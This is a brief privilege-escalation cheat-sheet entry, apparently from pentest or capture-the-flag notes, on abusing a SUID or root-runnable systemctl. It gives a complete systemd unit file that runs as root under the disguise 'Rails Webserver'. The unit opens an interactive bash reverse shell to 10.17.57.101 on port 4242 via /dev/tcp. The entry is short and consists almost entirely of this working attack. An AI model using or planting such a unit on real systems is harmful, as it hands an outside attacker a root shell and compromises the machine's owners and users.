## systemctl

* if systemctl has sed SUID or can run as root then 
* create service for root user reverse shell
* in /tmp directory

#### example

```
[Unit]
Description=Rails Webserver
After=syslog.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.57.101/4242 0>&1'

[Install]
WantedBy=multi-user.target

```